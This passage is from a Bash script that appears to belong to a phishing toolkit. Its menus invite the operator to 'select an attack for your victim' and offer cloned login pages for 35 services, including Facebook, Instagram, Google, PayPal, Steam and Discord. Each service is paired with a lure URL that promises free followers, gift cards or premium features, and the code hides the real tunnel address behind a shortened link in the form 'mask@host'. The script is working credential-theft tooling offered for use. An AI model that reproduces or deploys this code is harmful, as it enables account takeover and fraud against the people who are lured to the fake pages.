	read -p "${RED}[${WHITE}-${RED}]${GREEN} Ꮪ𝙴𝙻𝙴𝙲𝚃 Ꭺ Ꭾ𝙾𝚁𝚃 Ꮀ𝙾𝚁𝚆𝙰𝚁𝙳𝙸𝙽𝙶 Ꮪ𝙴𝚁𝚅𝙸𝙲𝙴 : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_cloudflared;;
		3 | 03)
			start_loclx;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Ꮠ𝙽𝚅𝙰𝙻𝙸𝙳 Ꭷ𝙿𝚃𝙸𝙾𝙽, Ꭲ𝚁𝚈 Ꭺ𝙶𝙰𝙸𝙽..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Custom Mask URL
custom_mask() {
	{ sleep .5; clear; banner_small; echo; }
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Ꭰ𝙾 𝚈𝙾𝚄 𝚆𝙰𝙽𝚃 𝚃𝙾 𝙲𝙷𝙰𝙽𝙶𝙴 Ꮇ𝙰𝚂𝙺 𝚄𝚁𝙻? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
	echo
	if [[ ${mask_op,,} == "y" ]]; then
		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Ꭼ𝙽𝚃𝙴𝚁 𝚈𝙾𝚄𝚁 𝙲𝚄𝚂𝚃𝙾𝙼 𝚄𝚁𝙻 Ᏼ𝙴𝙻𝙾𝚆 ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
			mask=$mask_url
			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} 𝚄𝚂𝙸𝙽𝙶 Ꮯ𝚄𝚂𝚃𝙾𝙼 Ꮇ𝙰𝚂𝙺𝙴𝙳 𝚄𝚁𝙻 :${GREEN} $mask"
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝚄𝚁𝙻 𝚃𝚈𝙿𝙴..𝚄𝚂𝙸𝙽𝙶 𝚃𝙷𝙴 𝙳𝙴𝙵𝙰𝚄𝙻𝚃 𝙾𝙽𝙴.."
		fi
	fi
}

## URL Shortner
site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }

shorten() {
	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	if [[ "$1" == *"shrtco.de"* ]]; then
		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	else
		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
		processed_url=${short#http*//}
	fi
}

custom_url() {
	url=${1#http*//}
	isgd="https://is.gd/create.php?format=simple&url="
	shortcode="https://api.shrtco.de/v2/shorten?url="
	tinyurl="https://tinyurl.com/api-create.php?url="

	{ custom_mask; sleep 1; clear; banner_small; }
	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
		if [[ $(site_stat $isgd) == 2* ]]; then
			shorten $isgd "$url"
		elif [[ $(site_stat $shortcode) == 2* ]]; then
			shorten $shortcode "$url"
		else
			shorten $tinyurl "$url"
		fi

		url="https://$url"
		masked_url="$mask@$processed_url"
		processed_url="https://$processed_url"
	else
		# echo "[!] No url provided / Regex Not Matched"
		url="𝚄𝙽𝙰𝙱𝙻𝙴 𝚃𝙾 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴 𝙻𝙸𝙽𝙺𝚂. 𝚃𝚁𝚈 𝙰𝙵𝚃𝙴𝚁 𝚃𝚄𝚁𝙽𝙸𝙽𝙶 𝙾𝙽 𝙷𝙾𝚃𝚂𝙿𝙾𝚃"
		processed_url="𝚄𝙽𝙰𝙱𝙻𝙴 𝚃𝙾 𝚂𝙷𝙾𝚁𝚃 𝚄𝚁𝙻"
	fi

	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
}

## Facebook
site_facebook() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} 𝚃𝚁𝙰𝙳𝙸𝚃𝙸𝙾𝙽𝙰𝙻 𝙻𝙾𝙶𝙸𝙽 𝙿𝙰𝙶𝙴
		${RED}[${WHITE}02${RED}]${ORANGE} Ꭺ𝙳𝚅𝙰𝙽𝙲𝙴𝙳 Ꮩ𝙾𝚃𝙸𝙽𝙶 Ꭾ𝙾𝙻𝙻 Ꮮ𝙾𝙶𝙸𝙽 Ꭾ𝙰𝙶𝙴
		${RED}[${WHITE}03${RED}]${ORANGE} Ꮀ𝙰𝙺𝙴 Ꮪ𝙴𝙲𝚄𝚁𝙸𝚃𝚈 Ꮮ𝙾𝙶𝙸𝙽 Ꭾ𝙰𝙶𝙴
		${RED}[${WHITE}04${RED}]${ORANGE} Ꮀ𝙰𝙲𝙴𝙱𝙾𝙾𝙺 Ꮇ𝙴𝚂𝚂𝙴𝙽𝙶𝙴𝚁 Ꮮ𝙾𝙶𝙸𝙽 Ꭾ𝙰𝙶𝙴

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Ꮪ𝙴𝙻𝙴𝙲𝚃 Ꭺ𝙽 Ꭷ𝙿𝚃𝙸𝙾𝙽 : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="Ꮀ𝙰𝙲𝙴Ᏼ𝙾𝙾𝙺"
			mask='https://blue-verified-badge-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			website="Ꮀ𝙱_Ꭺ𝙳𝚅𝙰𝙽𝙲𝙴𝙳"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			website="Ꮀ𝙱_Ꮪ𝙴𝙲𝚄𝚁𝙸𝚃𝚈"
			mask='https://make-your-facebook-secured-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
			website="Ꮀ𝙱_Ꮇ𝙴𝚂𝚂𝙴𝙽𝙶𝙴𝚁"
			mask='https://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Ꮠ𝙽𝚅𝙰𝙻𝙸𝙳 Ꭷ𝙿𝚃𝙸𝙾𝙽, Ꭲ𝚁𝚈 Ꭺ𝙶𝙰𝙸𝙽..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Ꭲ𝚁𝙰𝙳𝙸𝚃𝙸𝙾𝙽𝙰𝙻 Ꮮ𝙾𝙶𝙸𝙽 Ꭾ𝙰𝙶𝙴
		${RED}[${WHITE}02${RED}]${ORANGE} Ꭺ𝚄𝚃𝙾 Ꮀ𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 Ꮮ𝙾𝙶𝙸𝙽 Ꭾ𝙰𝙶𝙴
		${RED}[${WHITE}03${RED}]${ORANGE} 𝟻𝟶𝟶𝟶 Ꮀ𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 Ꮮ𝙾𝙶𝙸𝙽 Ꭾ𝙰𝙶𝙴
		${RED}[${WHITE}04${RED}]${ORANGE} Ᏼ𝙻𝚄𝙴 Ᏼ𝙰𝙳𝙶𝙴 Ꮩ𝙴𝚁𝙸𝙵𝚈 Ꮮ𝙾𝙶𝙸𝙽 Ꭾ𝙰𝙶𝙴

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Ꮪ𝙴𝙻𝙴𝙲𝚃 Ꭺ𝙽 Ꭷ𝙿𝚃𝙸𝙾𝙽 : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="𝙸𝙶_𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="𝙸𝙽𝚂𝚃𝙰_𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂"
			mask='https://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="𝙸𝙶_𝚅𝙴𝚁𝙸𝙵𝚈"
			mask='https://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Ꮠ𝙽𝚅𝙰𝙻𝙸𝙳 Ꭷ𝙿𝚃𝙸𝙾𝙽, Ꭲ𝚁𝚈 Ꭺ𝙶𝙰𝙸𝙽..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Ꮐ𝙼𝙰𝙸𝙻 Ꭷ𝙻𝙳 Ꮮ𝙾𝙶𝙸𝙽 Ꭾ𝙰𝙶𝙴
		${RED}[${WHITE}02${RED}]${ORANGE} Ꮐ𝙼𝙰𝙸𝙻 Ꮑ𝙴𝚆 Ꮮ𝙾𝙶𝙸𝙽 Ꭾ𝙰𝙶𝙴
		${RED}[${WHITE}03${RED}]${ORANGE} Ꭺ𝙳𝚅𝙰𝙽𝙲𝙴𝙳 Ꮩ𝙾𝚃𝙸𝙽𝙶 Ꭾ𝙾𝙻𝙻

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Ꮪ𝙴𝙻𝙴𝙲𝚃 Ꭺ𝙽 Ꭷ𝙿𝚃𝙸𝙾𝙽 : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="Ꮐ𝙾𝙾𝙶𝙻𝙴"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="Ꮐ𝙾𝙾𝙶𝙻𝙴_𝙽𝙴𝚆"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;
		3 | 03)
			website="Ꮐ𝙾𝙾𝙶𝙻𝙴_𝙿𝙾𝙻𝙻"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Ꮠ𝙽𝚅𝙰𝙻𝙸𝙳 Ꭷ𝙿𝚃𝙸𝙾𝙽, Ꭲ𝚁𝚈 Ꭺ𝙶𝙰𝙸𝙽..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}

## Vk
site_vk() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Ꭲ𝚁𝙰𝙳𝙸𝚃𝙸𝙾𝙽𝙰𝙻 Ꮮ𝙾𝙶𝙸𝙽 Ꭾ𝙰𝙶𝙴
		${RED}[${WHITE}02${RED}]${ORANGE} Ꭺ𝙳𝚅𝙰𝙽𝙲𝙴𝙳 Ꮩ𝙾𝚃𝙸𝙽𝙶 Ꭾ𝙾𝙻𝙻 Ꮮ𝙾𝙶𝙸𝙽 Ꭾ𝙰𝙶𝙴

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Ꮪ𝙴𝙻𝙴𝙲𝚃 Ꭺ𝙽 Ꭷ𝙿𝚃𝙸𝙾𝙽 : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="𝚅𝙺"
			mask='https://vk-premium-real-method-2020'
			tunnel_menu;;
		2 | 02)
			website="𝚅𝙺_𝙿𝙾𝙻𝙻"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Ꮠ𝙽𝚅𝙰𝙻𝙸𝙳 Ꭷ𝙿𝚃𝙸𝙾𝙽, Ꭲ𝚁𝚈 Ꭺ𝙶𝙰𝙸𝙽..."
			{ sleep 1; clear; banner_small; site_vk; };;
	esac
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Ꮪ𝙴𝙻𝙴𝙲𝚃 Ꭺ𝙽 Ꭺ𝚃𝚃𝙰𝙲𝙺 Ꮀ𝙾𝚁 Ꭹ𝙾𝚄𝚁 Ꮩ𝙸𝙲𝚃𝙸𝙼 ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} Ꮀ𝙰𝙲𝙴𝙱𝙾𝙾𝙺      ${RED}[${WHITE}11${RED}]${ORANGE} Ꭲ𝚆𝙸𝚃𝙲𝙷       ${RED}[${WHITE}21${RED}]${ORANGE} Ꭰ𝙴𝚅𝙸𝙰𝙽𝚃Ꭺ𝚁𝚃
		${RED}[${WHITE}02${RED}]${ORANGE} Ꮠ𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Ᏼ𝙰𝙳𝙾𝙾
		${RED}[${WHITE}03${RED}]${ORANGE} Ꮐ𝙾𝙾𝙶𝙻𝙴        ${RED}[${WHITE}13${RED}]${ORANGE} Ꮪ𝙽𝙰𝙿𝙲𝙷𝙰𝚃     ${RED}[${WHITE}23${RED}]${ORANGE} Ꭷ𝚁𝙸𝙶𝙸𝙽
		${RED}[${WHITE}04${RED}]${ORANGE} Ꮇ𝙸𝙲𝚁𝙾𝚂𝙾𝙵𝚃     ${RED}[${WHITE}14${RED}]${ORANGE} Ꮮ𝙸𝙽𝙺𝙴𝙳𝙸𝙽     ${RED}[${WHITE}24${RED}]${ORANGE} Ꭰ𝚁𝙾𝙿Ᏼ𝙾𝚇	
		${RED}[${WHITE}05${RED}]${ORANGE} Ꮑ𝙴𝚃𝙵𝙻𝙸𝚇       ${RED}[${WHITE}15${RED}]${ORANGE} Ꭼ𝙱𝙰𝚈         ${RED}[${WHITE}25${RED}]${ORANGE} Ꭹ𝙰𝙷𝙾𝙾		
		${RED}[${WHITE}06${RED}]${ORANGE} Ꭾ𝙰𝚈𝙿𝙰𝙻        ${RED}[${WHITE}16${RED}]${ORANGE} Ꭴ𝚄𝙾𝚁𝙰        ${RED}[${WHITE}26${RED}]${ORANGE} Ꮃ𝙾𝚁𝙳𝙿𝚁𝙴𝚂𝚂
		${RED}[${WHITE}07${RED}]${ORANGE} Ꮪ𝚃𝙴𝙰𝙼         ${RED}[${WHITE}17${RED}]${ORANGE} Ꭾ𝚁𝙾𝚃𝙾𝙽𝙼𝙰𝙸𝙻   ${RED}[${WHITE}27${RED}]${ORANGE} Ꭹ𝙰𝙽𝙳𝙴𝚇			
		${RED}[${WHITE}08${RED}]${ORANGE} Ꭲ𝚆𝙸𝚃𝚃𝙴𝚁       ${RED}[${WHITE}18${RED}]${ORANGE} Ꮪ𝙿𝙾𝚃𝙸𝙵𝚈      ${RED}[${WHITE}28${RED}]${ORANGE} Ꮪ𝚃𝙰𝙲𝙺𝙾𝚅𝙴𝚁Ꮀ𝙻𝙾𝚆
		${RED}[${WHITE}09${RED}]${ORANGE} Ꭾ𝙻𝙰𝚈𝚂𝚃𝙰𝚃𝙸𝙾𝙽   ${RED}[${WHITE}19${RED}]${ORANGE} Ꮢ𝙴𝙳𝙳𝙸𝚃       ${RED}[${WHITE}29${RED}]${ORANGE} Ꮩ𝙺
		${RED}[${WHITE}10${RED}]${ORANGE} Ꭲ𝙸𝙺𝚃𝙾𝙺        ${RED}[${WHITE}20${RED}]${ORANGE} Ꭺ𝙳𝙾𝙱𝙴        ${RED}[${WHITE}30${RED}]${ORANGE} 𝚇𝙱𝙾𝚇
		${RED}[${WHITE}31${RED}]${ORANGE} Ꮇ𝙴𝙳𝙸𝙰𝙵𝙸𝚁𝙴     ${RED}[${WHITE}32${RED}]${ORANGE} Ꮐ𝙸𝚃𝙻𝙰𝙱       ${RED}[${WHITE}33${RED}]${ORANGE} Ꮐ𝙸𝚃𝙷𝚄𝙱
		${RED}[${WHITE}34${RED}]${ORANGE} Ꭰ𝙸𝚂𝙲𝙾𝚁𝙳       ${RED}[${WHITE}35${RED}]${ORANGE} Ꮢ𝙾𝙱𝙻𝙾𝚇 

		${RED}[${WHITE}99${RED}]${ORANGE} Ꭺ𝙱𝙾𝚄𝚃         ${RED}[${WHITE}00${RED}]${ORANGE} Ꭼ𝚇𝙸𝚃

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Ꮪ𝙴𝙻𝙴𝙲𝚃 Ꭺ𝙽 Ꭷ𝙿𝚃𝙸𝙾𝙽 : ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			site_gmail;;
		4 | 04)
			website="𝙼𝙸𝙲𝚁𝙾𝚂𝙾𝙵𝚃"
			mask='https://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		5 | 05)
			website="𝙽𝙴𝚃𝙵𝙻𝙸𝚇"
			mask='https://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		6 | 06)
			website="𝙿𝙰𝚈𝙿𝙰𝙻"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		7 | 07)
			website="𝚂𝚃𝙴𝙰𝙼"
			mask='https://steam-500-usd-gift-card-free'
			tunnel_menu;;
		8 | 08)
			website="𝚃𝚆𝙸𝚃𝚃𝙴𝚁"
			mask='https://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		9 | 09)
			website="𝙿𝙻𝙰𝚈𝚂𝚃𝙰𝚃𝙸𝙾𝙽"
			mask='https://playstation-500-usd-gift-card-free'
			tunnel_menu;;
		10)
			website="𝚃𝙸𝙺𝚃𝙾𝙺"
			mask='https://tiktok-free-liker'
			tunnel_menu;;
		11)
			website="𝚃𝚆𝙸𝚃𝙲𝙷"
			mask='https://unlimited-twitch-tv-user-for-free'
			tunnel_menu;;
		12)
			website="𝙿𝙸𝙽𝚃𝙴𝚁𝙴𝚂𝚃"
			mask='https://get-a-premium-plan-for-pinterest-free'
			tunnel_menu;;
		13)
			website="𝚂𝙽𝙰𝙿𝙲𝙷𝙰𝚃"
			mask='https://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
		14)
			website="𝙻𝙸𝙽𝙺𝙴𝙳𝙸𝙽"
			mask='https://get-a-premium-plan-for-linkedin-free'
			tunnel_menu;;
		15)
			website="𝙴𝙱𝙰𝚈"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		16)
			website="𝚀𝚄𝙾𝚁𝙰"
			mask='https://quora-premium-for-free'
			tunnel_menu;;
		17)
			website="𝙿𝚁𝙾𝚃𝙾𝙽𝙼𝙰𝙸𝙻"
			mask='https://protonmail-pro-basics-for-free'
			tunnel_menu;;
		18)
			website="𝚂𝙿𝙾𝚃𝙸𝙵𝚈"
			mask='https://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		19)
			website="𝚁𝙴𝙳𝙳𝙸𝚃"
			mask='https://reddit-official-verified-member-badge'
			tunnel_menu;;
		20)
			website="𝙰𝙳𝙾𝙱𝙴"
			mask='https://get-adobe-lifetime-pro-membership-free'
			tunnel_menu;;
		21)
			website="𝙳𝙴𝚅𝙸𝙰𝙽𝚃𝙰𝚁𝚃"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		22)
			website="𝙱𝙰𝙳𝙾𝙾"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		23)
			website="𝙾𝚁𝙸𝙶𝙸𝙽"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		24)
			website="𝙳𝚁𝙾𝙿𝙱𝙾𝚇"
			mask='https://get-1TB-cloud-storage-free'
			tunnel_menu;;
		25)
			website="𝚈𝙰𝙷𝙾𝙾"
			mask='https://grab-mail-from-anyother-yahoo-account-free'
			tunnel_menu;;
		26)
			website="𝚆𝙾𝚁𝙳𝙿𝚁𝙴𝚂𝚂"
			mask='https://unlimited-wordpress-traffic-free'
			tunnel_menu;;
		27)
			website="𝚈𝙰𝙽𝙳𝙴𝚇"
			mask='https://grab-mail-from-anyother-yandex-account-free'
			tunnel_menu;;
		28)
			website="𝚂𝚃𝙰𝙲𝙺𝙾𝚅𝙴𝚁𝙵𝙻𝙾𝚆"
			mask='https://get-stackoverflow-lifetime-pro-membership-free'
			tunnel_menu;;
		29)
			site_vk;;
		30)
			website="𝚇𝙱𝙾𝚇"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		31)
			website="𝙼𝙴𝙳𝙸𝙰𝙵𝙸𝚁𝙴"
			mask='https://get-1TB-on-mediafire-free'
			tunnel_menu;;
		32)
			website="gitlab"
			mask='https://get-1k-followers-on-gitlab-free'
			tunnel_menu;;
		33)
			website="𝙶𝙸𝚃𝙷𝚄𝙱"
			mask='https://get-1k-followers-on-github-free'
			tunnel_menu;;
		34)
			website="𝙳𝙸𝚂𝙲𝙾𝚁𝙳"
			mask='https://get-discord-nitro-free'
			tunnel_menu;;
		35)
			website="𝚁𝙾𝙱𝙻𝙾𝚇"
			mask='https://get-free-robux'
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Ꮠ𝙽𝚅𝙰𝙻𝙸𝙳 Ꭷ𝙿𝚃𝙸𝙾𝙽, Ꭲ𝚁𝚈 Ꭺ𝙶𝙰𝙸𝙽..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
check_status
install_cloudflared
install_localxpose
main_menu
